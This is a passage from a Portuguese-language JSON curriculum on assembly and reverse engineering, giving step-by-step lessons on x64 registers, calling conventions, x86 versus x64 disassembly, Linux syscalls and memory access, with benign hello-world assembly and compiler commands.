                                    "Identifique como acessar partes menores: mov eax, 1 afeta só os 32 bits baixos de RAX.",
                                    "Pratique convertendo: RAX -> EAX -> AX -> AL.",
                                    "Compare com x86: em x64, registradores de 64 bits são extensões.",
                                    "Liste exemplos para cada registrador principal."
                                  ],
                                  "verification": "Para 3 registradores aleatórios (ex: RBX, RCX, RDI), liste todos os tamanhos menores corretamente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Tabela de registradores x64 com tamanhos (Intel manual ou cheat sheet)",
                                    "Ferramenta online como 'x86 register viewer'"
                                  ],
                                  "tips": "Pense nos registradores como 'camadas': o maior engloba os menores.",
                                  "learningObjective": "Diferenciar e nomear corretamente variantes de 64, 32, 16 e 8 bits dos registradores principais.",
                                  "commonMistakes": [
                                    "Achar que EAX é um registrador separado, não parte de RAX",
                                    "Ignorar AH/AL para bytes altos/baixos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Registradores Adicionais R8 a R15",
                                  "subSteps": [
                                    "Liste os 8 registradores extras: R8, R9, R10, R11, R12, R13, R14, R15.",
                                    "Note convenções de chamada: R8-R9 para parâmetros de função (Windows x64).",
                                    "Aprenda variantes: R8D (32-bit), R8W (16-bit), R8B (8-bit).",
                                    "Compare com principais: usados em funções com >4 parâmetros.",
                                    "Pratique listando todos os 16 registradores de 64 bits."
                                  ],
                                  "verification": "Escreva a lista completa de RAX a R15 e indique 2 usos comuns para R8-R15.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Cheat sheet x64 calling convention",
                                    "Exemplo de código assembly com R8+"
                                  ],
                                  "tips": "Lembre como 'R8 a R15 são os reservas para parâmetros extras'.",
                                  "learningObjective": "Nomear e descrever os registradores R8-R15 e suas variantes de tamanho.",
                                  "commonMistakes": [
                                    "Confundir ordem: R8 primeiro, não RAX depois",
                                    "Esquecer variantes como R15B"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Descrever Registradores SSE/AVX de Uso Geral",
                                  "subSteps": [
                                    "Introduza SSE: XMM0-XMM15 (128 bits cada, para SIMD).",
                                    "Expanda para AVX: YMM0-YMM15 (256 bits), ZMM0-ZMM31 (512 bits em AVX-512).",
                                    "Entenda uso: instruções como movaps xmm0, xmm1 para vetores.",
                                    "Liste registradores de controle: MXCSR para SSE.",
                                    "Diferencie de GPRs: vetoriais vs escalares."
                                  ],
                                  "verification": "Liste XMM0-15, YMM0-15 e descreva um uso básico para cada tipo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Intel Intrinsics Guide (sse/avx registers)",
                                    "Vídeo curto sobre SIMD registers"
                                  ],
                                  "tips": "Visualize XMM como 4 floats de 32-bit em um registrador.",
                                  "learningObjective": "Identificar registradores SSE/AVX e diferenciar de registradores de propósito geral.",
                                  "commonMistakes": [
                                    "Confundir XMM com GPRs",
                                    "Achar que AVX usa os mesmos registradores que SSE sem extensão"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar Identificação em Código Assembly Real",
                                  "subSteps": [
                                    "Abra um binário simples em disassembler (ex: objdump ou Ghidra).",
                                    "Identifique usos de RAX-R15 e XMM em instruções.",
                                    "Anote 5 exemplos de cada tipo de registrador.",
                                    "Compare tamanhos em instruções: mov rax vs mov eax.",
                                    "Teste em debugger: veja valores em runtime."
                                  ],
                                  "verification": "Capture screenshot ou liste 10 registradores identificados corretamente de um binário.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ghidra ou IDA Free",
                                    "Binário de teste: compile 'hello world' em x64"
                                  ],
                                  "tips": "Use filtro de busca por 'rax' ou 'xmm' no disassembler.",
                                  "learningObjective": "Aplicar conhecimento para identificar registradores em assembly real.",
                                  "commonMistakes": [
                                    "Ignorar registradores em instruções otimizadas",
                                    "Confundir flags (como ZF) com registradores"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma análise de malware usando Ghidra, identifique que uma função usa R10 para loop counter (extra reg) e XMM0 para descriptografia SIMD, diferenciando mov r10d (32-bit) de mov r10 (64-bit).",
                              "finalVerifications": [
                                "Liste corretamente os 16 registradores GPR de 64 bits (RAX-R15).",
                                "Diferencie variantes de tamanho para RAX, RBX e R12.",
                                "Descreva funções típicas de RSP, RBP e R8.",
                                "Identifique 5 registradores SSE/AVX e um uso.",
                                "Explique diferença entre XMM e YMM.",
                                "Em um snippet assembly, aponte todos os registradores usados com tamanhos corretos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na nomenclatura de todos os registradores (100% correto).",
                                "Correta diferenciação de tamanhos e prefixos (sem erros em exemplos).",
                                "Descrição adequada de funções/uso para pelo menos 80% dos registradores.",
                                "Identificação correta em código real (mínimo 90% acurácia).",
                                "Compreensão de SSE/AVX vs GPRs demonstrada em explicação.",
                                "Uso de terminologia técnica apropriada."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender como compilador mapeia variáveis para registradores.",
                                "Sistemas Operacionais: Convenções de chamada x64 (System V vs Windows).",
                                "Otimização de Performance: Uso de AVX para computação paralela.",
                                "Criptografia: SSE/AVX em rotinas de hash/excriptação.",
                                "Análise de Malware: Identificar payloads em registradores durante RE."
                              ],
                              "realWorldApplication": "Em engenharia reversa de binários para segurança computacional, identificar registradores x64 permite mapear fluxo de dados, detectar ofuscação via R8-R15 e analisar vetores SSE/AVX em exploits zero-day, essencial para ferramentas como IDA Pro ou debuggers em incident response."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.2.2",
                            "name": "Analisar instruções x64 e convenções de chamada",
                            "description": "Interpretar instruções semelhantes às de x86, mas com suporte a 64 bits, e entender a System V ABI ou Microsoft x64 calling convention para passagem de parâmetros.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender instruções básicas x64 e sua sintaxe",
                                  "subSteps": [
                                    "Estudar os registradores principais em x64: RAX, RBX, RCX, RDX, RSI, RDI, R8-R15 e seus sub-registros (EAX, AX, etc.).",
                                    "Identificar instruções comuns como MOV, ADD, SUB, PUSH, POP, CALL, RET e JMP.",
                                    "Explorar modos de endereçamento: direto, indireto, RIP-relative e escalonado.",
                                    "Analisar o papel do prefixo REX para extensões de 64 bits e registradores adicionais."
                                  ],
                                  "verification": "Listar e explicar corretamente 8 registradores principais e 5 instruções com exemplos de sintaxe.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Manual Intel 64 and IA-32 Architectures (Volume 2)",
                                    "Ferramenta de desassembly como objdump ou Ghidra"
                                  ],
                                  "tips": "Comece comparando com x86 para destacar similaridades e diferenças; use um debugger como GDB para visualizar registradores.",
                                  "learningObjective": "Dominar a sintaxe e registradores fundamentais de assembly x64.",
                                  "commonMistakes": [
                                    "Confundir tamanhos de registradores (ex: usar EAX em contexto 64-bit sem truncamento).",
                                    "Ignorar o prefixo REX em instruções estendidas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar diferenças chave entre x86 e x64",
                                  "subSteps": [
                                    "Comparar pilha: x64 usa RSP em vez de ESP, com alinhamento de 16 bytes.",
                                    "Analisar mudanças em instruções: ausência de PUSH/POP de immediatos >32 bits, uso de LEA para aritmética.",
                                    "Estudar extensões: suporte nativo a 64-bit immediatos e endereços.",
                                    "Revisar flags e status registers (RFLAGS vs EFLAGS)."
                                  ],
                                  "verification": "Explicar 4 diferenças principais com exemplos de código assembly equivalente em x86 e x64.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Comparativo x86/x64 da documentação AMD64",
                                    "Exemplos de código em NASM ou MASM"
                                  ],
                                  "tips": "Compile um programa C simples em -m32 e -m64 e compare o assembly gerado com gcc -S.",
                                  "learningObjective": "Reconhecer e interpretar adaptações de x86 para o ambiente 64-bit.",
                                  "commonMistakes": [
                                    "Assumir que PUSH/POP funcionam identicamente para valores grandes.",
                                    "Esquecer alinhamento da pilha em chamadas de função."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar System V AMD64 ABI (Linux/Unix)",
                                  "subSteps": [
                                    "Memorizar passagem de parâmetros: primeiros 6 inteiros/flutuantes em RDI, RSI, RDX, RCX, R8, R9; resto na pilha.",
                                    "Entender convenções de callee: alocar espaço na pilha (red zone de 128 bytes), preservar RBX, RBP, R12-R15.",
                                    "Analisar retorno: RAX para inteiro único, XMM0 para float.",
                                    "Examinar alinhamento da pilha e prologue/epílogo de funções."
                                  ],
                                  "verification": "Desenhar diagrama de como uma função com 7 parâmetros é chamada, identificando registradores e pilha.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "System V ABI AMD64 PDF",
                                    "Exemplos em C compilados com gcc em Linux"
                                  ],
                                  "tips": "Use 'gdb' com 'disassemble main' para inspecionar funções reais e parâmetros.",
                                  "learningObjective": "Aplicar regras da System V ABI para análise de chamadas de função.",
                                  "commonMistakes": [
                                    "Confundir ordem de registradores (RCX vs RDX).",
                                    "Esquecer red zone e sub rsp,8 para alinhamento."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estudar Microsoft x64 Calling Convention (Windows)",
                                  "subSteps": [
                                    "Aprender parâmetros: RCX, RDX, R8, R9 para primeiros 4; resto na pilha com 32 bytes shadow space.",
                                    "Entender preservação: callee limpa shadow space, preserva RBX, RBP, RDI, RSI, R12-R15, etc.",
                                    "Analisar retorno similar a System V (RAX/XMM0).",
                                    "Comparar com System V: foco em shadow space vs red zone."
                                  ],
                                  "verification": "Analisar um exemplo Windows PE e identificar shadow space em prologue.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Microsoft x64 Software Conventions PDF",
                                    "Ferramentas como x64dbg ou IDA Pro demo"
                                  ],
                                  "tips": "Compile com Visual Studio cl.exe /Fa para gerar assembly e compare ABIs.",
                                  "learningObjective": "Diferenciar e aplicar convenções Microsoft x64 em binários Windows.",
                                  "commonMistakes": [
                                    "Misturar registradores iniciais (RCX primeiro vs RDI).",
                                    "Ignorar alocação obrigatória de 32 bytes shadow space."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar análise integrada de instruções e chamadas",
                                  "subSteps": [
                                    "Desassemblar uma função simples e mapear parâmetros via ABI correta.",
                                    "Rastrear fluxo: identificar prologue, body, epílogo e convenções.",
                                    "Simular execução passo a passo com debugger.",
                                    "Identificar cross-ABI em binários multi-plataforma."
                                  ],
                                  "verification": "Analisar um snippet fornecido e explicar passagem/retorno de params corretamente.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Binários de teste em ELF/PE",
                                    "Debugger: GDB para Linux, x64dbg para Windows"
                                  ],
                                  "tips": "Comece com funções printf para ver convenções em ação.",
                                  "learningObjective": "Integrar conhecimento para análise real de código x64.",
                                  "commonMistakes": [
                                    "Não detectar ABI pelo OS/binário.",
                                    "Perder rastreamento de params em loops ou condicionais."
                                  ]
                                }
                              ],
                              "practicalExample": "Considere o snippet x64 (System V): sub rsp,8; mov rax, rdi; imul rax, rsi; add rax, rdx; add rsp,8; ret;. Análise: Parâmetros a*x + y em RDI (a), RSI (x), RDX (y); prologue alinha pilha; epílogo restaura; retorna em RAX.",
                              "finalVerifications": [
                                "Identificar corretamente registradores de parâmetro para uma dada ABI.",
                                "Explicar prologue/epílogo em um desassembly.",
                                "Diferenciar System V vs Microsoft em exemplos mistos.",
                                "Rastrear um valor de parâmetro até retorno.",
                                "Detectar erros de convenção em código inválido."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de instruções e registradores (90%+).",
                                "Correta aplicação de ABI para mapeamento de parâmetros.",
                                "Análise completa de fluxo de uma função pequena.",
                                "Uso de terminologia técnica precisa.",
                                "Identificação de pelo menos 3 potenciais erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Compreender como variáveis locais e params compilam para assembly.",
                                "Sistemas Operacionais: Interação com kernel via syscalls seguindo ABI.",
                                "Segurança Computacional: Análise de exploits ROP usando convenções de chamada.",
                                "Arquitetura de Computadores: Otimizações de registradores em 64-bit.",
                                "Debugging e Ferramentas: Uso de disassemblers em cenários reais."
                              ],
                              "realWorldApplication": "Em engenharia reversa de malware, analisar binários x64 para entender injeções de código, chamadas de API ofuscadas ou exploits de buffer overflow que dependem de convenções de chamada para ROP chains e detecção de vulnerabilidades."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.2.3",
                            "name": "Comparar x86 e x64 em disassembly",
                            "description": "Comparar código assembly gerado em 32 e 64 bits para o mesmo programa fonte, identificando diferenças em tamanho de registradores e endereços.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente e Preparar Código Fonte",
                                  "subSteps": [
                                    "Escolha um programa C simples, como uma função que soma dois inteiros: int add(int a, int b) { return a + b; } em main().",
                                    "Instale ou verifique GCC com suporte a 32 e 64 bits (ex: sudo apt install gcc-multilib no Linux).",
                                    "Compile para x86 (32-bit): gcc -m32 -o programa_x86 programa.c -fno-stack-protector.",
                                    "Compile para x64 (64-bit): gcc -m64 -o programa_x64 programa.c -fno-stack-protector.",
                                    "Verifique tamanhos dos binários com ls -lh."
                                  ],
                                  "verification": "Dois executáveis gerados (programa_x86 e programa_x64) com tamanhos diferentes e executáveis.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GCC compiler com multilib",
                                    "Editor de texto (VS Code ou nano)",
                                    "Terminal/Linux ou WSL"
                                  ],
                                  "tips": "Use flags idênticas exceto -m32/-m64 para isolamento de diferenças arquiteturais.",
                                  "learningObjective": "Preparar binários comparáveis compilados do mesmo fonte em arquiteturas x86 e x64.",
                                  "commonMistakes": [
                                    "Omitir -fno-stack-protector, poluindo com ASLR",
                                    "Compilar sem otimização (-O0 para clareza)",
                                    "Usar SO sem suporte multilib"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar Disassembly dos Binários",
                                  "subSteps": [
                                    "Instale objdump (parte do binutils) ou use Ghidra/IDA Free.",
                                    "Execute disassembly x86: objdump -d -M intel programa_x86 > disassembly_x86.txt.",
                                    "Execute disassembly x64: objdump -d -M intel programa_x64 > disassembly_x64.txt.",
                                    "Abra ambos arquivos em um editor para visualização lado a lado.",
                                    "Extraia seções relevantes como .text e função main."
                                  ],
                                  "verification": "Arquivos disassembly_x86.txt e disassembly_x64.txt gerados com código assembly legível.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Objdump ou Ghidra",
                                    "Editor de texto com split view (VS Code)"
                                  ],
                                  "tips": "Use -M intel para sintaxe Intel, mais legível para iniciantes em comparação com AT&T.",
                                  "learningObjective": "Obter representações assembly detalhadas de ambos binários para análise comparativa.",
                                  "commonMistakes": [
                                    "Usar sintaxe errada (-M att por default em alguns sistemas)",
                                    "Disassemble seção errada (foco em .text)",
                                    "Ignorar headers de arquivo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Registradores, Instruções e Tamanhos",
                                  "subSteps": [
                                    "Identifique registradores: x86 usa EAX/EBX (32-bit), x64 usa RAX/RBX (64-bit).",
                                    "Compare instruções: mov eax, 1 vs mov rax, 1; observe extensões REX prefix.",
                                    "Analise tamanhos de instruções: x64 pode ser mais compacto com RIP-relative.",
                                    "Marque diferenças em push/pop e stack usage.",
                                    "Anote mudanças em flags e operandos imediatos."
                                  ],
                                  "verification": "Tabela ou notas comparando pelo menos 5 pares de registradores e 3 instruções equivalentes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Arquivos disassembly",
                                    "Planilha ou Markdown para tabela comparativa"
                                  ],
                                  "tips": "Foco em registradores de uso geral (GP): EAX->RAX, ESI->RSI, etc.",
                                  "learningObjective": "Reconhecer diferenças fundamentais em registradores e encoding de instruções entre x86 e x64.",
                                  "commonMistakes": [
                                    "Confundir registradores de 32-bit em x64 (ainda funcionam mas truncam)",
                                    "Ignorar prefixos REX que habilitam 64-bit",
                                    "Assumir tamanhos idênticos de instruções"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Endereços, Calling Conventions e Documentar",
                                  "subSteps": [
                                    "Compare endereços: x86 usa EIP absoluto, x64 usa RIP-relative (lea rip-based).",
                                    "Examine calling conventions: x86 stdcall/cdecl stack-based vs x64 System V register-based (args em RDI, RSI).",
                                    "Documente impactos em tamanho de código e performance.",
                                    "Crie um relatório resumindo 5-10 diferenças chave.",
                                    "Teste execução com gdb para validar observações."
                                  ],
                                  "verification": "Relatório final com lista de diferenças em endereços e conventions, validado por execução.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GDB debugger",
                                    "Template de relatório Markdown"
                                  ],
                                  "tips": "Em x64 Linux, args: RDI, RSI, RDX, RCX, R8, R9; stack para mais.",
                                  "learningObjective": "Entender implicações práticas de endereçamento e convenções de chamada em disassembly.",
                                  "commonMistakes": [
                                    "Ignorar ASLR afetando endereços absolutos",
                                    "Confundir conventions Windows vs Linux",
                                    "Não testar com debugger"
                                  ]
                                }
                              ],
                              "practicalExample": "Programa C: int main() { int a=1, b=2; return a+b; }. Compile: gcc -m32 -O0 -o sum32 sum.c; gcc -m64 -O0 -o sum64 sum.c. Disassembly x86 main: push ebp; mov ebp, esp; mov eax, 1; ... add eax, 2; leave; ret. x64: push rbp; mov rbp, rsp; mov eax, 1; ... add eax, 2; pop rbp; ret. Diferenças: ebp/rbp (32/64-bit), eax comum mas contexto stack vs registers, x64 mais compacto.",
                              "finalVerifications": [
                                "Lista correta de registradores x86 (EAX, EBX) vs x64 (RAX, RBX).",
                                "Identificação de RIP-relative addressing em x64 ausente em x86.",
                                "Comparação precisa de calling convention (stack vs registers).",
                                "Observação de prefixos REX em x64 instructions.",
                                "Relatório documenta pelo menos 8 diferenças chave.",
                                "Validação via execução em debugger sem crashes.",
                                "Explicação de impacto em tamanho de binário (x64 geralmente menor)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de 32 vs 64-bit registradores (90%+).",
                                "Correta distinção de endereçamento absoluto vs relativo (sem erros).",
                                "Análise de pelo menos 3 instruções equivalentes com diferenças exatas.",
                                "Compreensão demonstrada de calling conventions via exemplos.",
                                "Relatório claro, com tabelas e screenshots de disassembly.",
                                "Tempo de análise eficiente sem erros comuns.",
                                "Aplicação a exemplo prático sem discrepâncias."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Estudo de ISAs e registradores.",
                                "Programação em C: Entender como alto-nível vira assembly.",
                                "Segurança Computacional: Base para análise de exploits shellcode.",
                                "Sistemas Operacionais: Calling conventions e ABI.",
                                "Análise de Binários: Pré-requisito para RE e debugging."
                              ],
                              "realWorldApplication": "Em engenharia reversa de malware, comparar binários x86/x64 ajuda a detectar payloads multiplataforma, otimizar shellcodes para arquitetura específica ou debugar crashes em apps legacy 32-bit rodando em SO 64-bit."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.5.3",
                        "name": "Chamadas de Sistema e Acesso a Memória",
                        "description": "Mecanismos de interação com o kernel via chamadas de sistema e técnicas de acesso a memória em x86 e x64.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.5.3.1",
                            "name": "Analisar chamadas de sistema em x86 e x64",
                            "description": "Identificar interrupções INT 0x80 em x86 e instrução SYSCALL em x64, decodificando números de syscall (ex: sys_write, sys_exit) e passagem de argumentos via registradores.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender chamadas de sistema em x86 (32-bit) com INT 0x80",
                                  "subSteps": [
                                    "Estude a convenção de chamadas Linux x86: número da syscall em EAX, argumentos em EBX, ECX, EDX, ESI, EDI.",
                                    "Identifique a instrução INT 0x80 como mecanismo de transição para kernel mode.",
                                    "Consulte tabelas de syscalls Linux x86 (ex: sys_exit=1, sys_write=4).",
                                    "Examine um exemplo simples de assembly x86 usando INT 0x80.",
                                    "Pratique identificando INT 0x80 em um binário desmontado."
                                  ],
                                  "verification": "Desmonte um binário x86 simples e anote o valor em EAX antes de INT 0x80, confirmando com tabela de syscalls.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Linux syscalls x86",
                                    "NASM ou GAS assembler",
                                    "GDB debugger",
                                    "Exemplo de código hello world x86"
                                  ],
                                  "tips": [
                                    "Use objdump -d para desmontar binários estáticos.",
                                    "Memorize os primeiros 10 syscalls comuns."
                                  ],
                                  "learningObjective": "Compreender o mecanismo INT 0x80 e convenção de registradores em x86.",
                                  "commonMistakes": [
                                    "Confundir INT 0x80 com INT 0x21 (DOS).",
                                    "Ignorar alinhamento de registradores para argumentos.",
                                    "Não verificar modo de usuário vs kernel."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender chamadas de sistema em x64 com SYSCALL",
                                  "subSteps": [
                                    "Estude a convenção AMD64: número da syscall em RAX, argumentos em RDI, RSI, RDX, R10, R8, R9.",
                                    "Identifique a instrução SYSCALL como sucessora rápida do INT 0x80.",
                                    "Consulte tabelas de syscalls Linux x64 (compatível com x86 para muitos números).",
                                    "Examine diferenças: SYSCALL usa RCX para IP de retorno, R11 para flags.",
                                    "Pratique identificando SYSCALL em um binário x64 desmontado."
                                  ],
                                  "verification": "Desmonte um binário x64 e liste registradores usados antes de SYSCALL, validando com tabela.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação AMD64 ABI",
                                    "NASM para x64",
                                    "GDB com suporte x64",
                                    "Exemplo de código hello world x64"
                                  ],
                                  "tips": [
                                    "SYSCALL é mais rápida; foque em RAX para syscall ID.",
                                    "Use 'info registers' no GDB para x64."
                                  ],
                                  "learningObjective": "Dominar o mecanismo SYSCALL e convenção de registradores em x64.",
                                  "commonMistakes": [
                                    "Usar convenção x86 em x64 (ex: EBX ao invés de RDI).",
                                    "Esquecer R10 ao invés de RCX para 4º argumento.",
                                    "Confundir SYSRET com SYSCALL."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Decodificar números de syscall comuns (sys_write, sys_exit, etc.)",
                                  "subSteps": [
                                    "Baixe e memorize tabela de syscalls Linux para x86 e x64 (sys_read=0, sys_write=1, sys_exit=60 em x64).",
                                    "Identifique sys_exit (1 em x86, 60 em x64) e sys_write (4 em x86, 1 em x64).",
                                    "Analise um binário com múltiplas syscalls e mapeie EAX/RAX para nomes.",
                                    "Use ferramentas como strace para correlacionar syscalls em runtime.",
                                    "Crie um mapeamento pessoal de 20 syscalls comuns."
                                  ],
                                  "verification": "Para um binário dado, liste todas syscalls detectadas com nomes corretos e discrepâncias x86/x64.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Tabelas syscalls (kernel.org)",
                                    "strace tool",
                                    "Binários de teste estáticos",
                                    "Planilha ou script para mapeamento"
                                  ],
                                  "tips": [
                                    "sys_write x86=4, x64=1; sempre cheque arquitetura.",
                                    "strace -e trace=write,exit binário para validação."
                                  ],
                                  "learningObjective": "Decodificar precisamente IDs de syscall em ambos os formatos.",
                                  "commonMistakes": [
                                    "Usar tabela errada (x86 vs x64 têm números diferentes).",
                                    "Ignorar syscalls personalizadas ou wrappers.",
                                    "Confundir exit_group com exit."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar passagem de argumentos via registradores e fluxo completo",
                                  "subSteps": [
                                    "Trace argumentos para sys_write: buffer em ECX/RSI, tamanho em EDX/RDX.",
                                    "Para sys_exit: status em EBX/RDI.",
                                    "Analise fluxo: setup registradores -> syscall -> cheque retorno em EAX/RAX (-errno ou positivo).",
                                    "Examine binários híbridos ou position-independent para variações.",
                                    "Simule execução passo a passo com GDB."
                                  ],
                                  "verification": "Em GDB, defina breakpoints em syscall, inspecione registradores pré/pós e confirme comportamento.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "GDB avançado",
                                    "Binários com syscalls instrumentados",
                                    "Radare2 ou Ghidra para análise estática"
                                  ],
                                  "tips": [
                                    "'x/i $pc' no GDB para instruções; 'info reg' para todos registradores.",
                                    "Retorno negativo em EAX/RAX indica erro."
                                  ],
                                  "learningObjective": "Analisar completamente argumentos, retornos e fluxo de uma syscall.",
                                  "commonMistakes": [
                                    "Não preservar registradores callee-saved.",
                                    "Interpretar incorretamente ponteiro de buffer.",
                                    "Ignorar verificação de erros pós-syscall."
                                  ]
                                }
                              ],
                              "practicalExample": "Exemplo x86 (sys_write 4, sys_exit 1):\nsection .data\nmsg db 'Hello',10\nlen equ $ - msg\nsection .text\nglobal _start\n_start:\nmov eax, 4\nmov ebx, 1\nmov ecx, msg\nmov edx, len\nint 0x80\nmov eax, 1\nmov ebx, 0\nint 0x80\nExemplo x64 (sys_write 1, sys_exit 60):\nsection .data\nmsg db 'Hello',10\nlen equ $ - msg\nsection .text\nglobal _start\n_start:\nmov rax, 1\nmov rdi, 1\nmov rsi, msg\nmov rdx, len\nsyscall\nmov rax, 60\nmov rdi, 0\nsyscall\nAnalise: Identifique instruções, registradores e decodifique.",
                              "finalVerifications": [
                                "Identifica corretamente INT 0x80 vs SYSCALL em desmontagem.",
                                "Mapeia EAX/RAX para nomes de syscall com 100% precisão em exemplos.",
                                "Lista argumentos corretos por posição/registrador para sys_write e sys_exit.",
                                "Detecta tratamento de erros pós-syscall (EAX/RAX < 0).",
                                "Diferencia convenções x86 vs x64 sem erros.",
                                "Analisa fluxo completo em GDB para binário fornecido."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de instruções syscall: 25%.",
                                "Correção no mapeamento de syscall IDs: 25%.",
                                "Análise de argumentos e registradores: 20%.",
                                "Compreensão de retornos e erros: 15%.",
                                "Aplicação em análise estática/dinâmica: 10%.",
                                "Comparação x86/x64: 5%."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mecanismos de chamadas kernel.",
                                "Programação em Assembly: Manipulação de registradores.",
                                "Segurança Computacional: Detecção de syscalls em malware.",
                                "Engenharia Reversa: Análise de binários com Ghidra/IDA.",
                                "Arquitetura de Computadores: Diferenças x86/x64."
                              ],
                              "realWorldApplication": "Em análise de malware, identificar syscalls permite detectar técnicas de persistência (sys_open para arquivos), exfiltração de dados (sys_sendto) ou evasão de detecção, essencial para engenheiros de segurança reversos engenharem binários maliciosos em ambientes Linux x86/x64."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.3.2",
                            "name": "Examinar acesso a memória em assembly",
                            "description": "Descrever operações de leitura/escrita em memória usando [registrador + offset], stack (PUSH/POP) e heap, considerando proteções como ASLR e NX bit.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender acessos à memória via registrador + offset",
                                  "subSteps": [
                                    "Estudar a sintaxe de operações de leitura/escrita como MOV reg, [reg_base + offset] em x86 e x64.",
                                    "Identificar exemplos em código assembly: offsets positivos (heap) e negativos (stack).",
                                    "Usar GDB para inspecionar memória: comando 'x' para examinar endereços.",
                                    "Analisar como offsets são calculados em relação ao registrador base (ex: EBP para stack frame).",
                                    "Praticar com um binário simples: compilar C para assembly e rastrear acessos."
                                  ],
                                  "verification": "Listar e explicar 5 instruções [reg + offset] de um binário desmontado no GDB.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GDB ou IDA Pro/Free",
                                    "Binário de exemplo em C compilado com -g -O0",
                                    "Documentação Intel x86/x64"
                                  ],
                                  "tips": "Sempre verifique o registrador base (EBP/RBP para stack, EAX para heap pointers).",
                                  "learningObjective": "Identificar e descrever operações de load/store usando offsets relativos.",
                                  "commonMistakes": [
                                    "Confundir offsets relativos com endereços absolutos.",
                                    "Ignorar diferenças entre 32-bit e 64-bit (RIP-relative).",
                                    "Não considerar alinhamento de memória."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar operações na stack com PUSH e POP",
                                  "subSteps": [
                                    "Explicar PUSH: decrementa ESP/RSP e escreve valor na stack.",
                                    "Explicar POP: lê valor da stack e incrementa ESP/RSP.",
                                    "Rastrear stack frames em funções: prologue/epilogue com PUSH EBP; MOV EBP, ESP.",
                                    "Usar GDB: comandos 'info registers esp', 'x/10x $esp' para visualizar stack.",
                                    "Identificar overflows/underflows potenciais em sequências PUSH/POP."
                                  ],
                                  "verification": "Desmontar uma função recursiva e mapear PUSH/POP para variáveis locais.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "GDB",
                                    "Exemplo C com funções recursivas",
                                    "Referência assembly stack layout"
                                  ],
                                  "tips": "Lembre-se: stack cresce para baixo (endereços menores).",
                                  "learningObjective": "Descrever o impacto de PUSH/POP no ponteiro da stack e em acessos subsequentes.",
                                  "commonMistakes": [
                                    "Assumir ordem LIFO incorreta.",
                                    "Confundir PUSH com alocação heap.",
                                    "Não notar PUSH de flags ou registradores múltiplos."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Examinar acessos ao heap",
                                  "subSteps": [
                                    "Entender alocação heap via malloc/brk em assembly (chamadas syscall).",
                                    "Identificar ponteiros heap: armazenados em registradores ou stack, acessados via [reg + offset].",
                                    "Rastrear free/use-after-free: monitorar invalidação de ponteiros.",
                                    "Usar GDB com heap debugging: 'heap' plugin ou valgrind para correlacionar.",
                                    "Analisar chunks heap em ptmalloc (glibc): metadata e acessos."
                                  ],
                                  "verification": "Em um binário com malloc, identificar 3 acessos heap e seu propósito.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
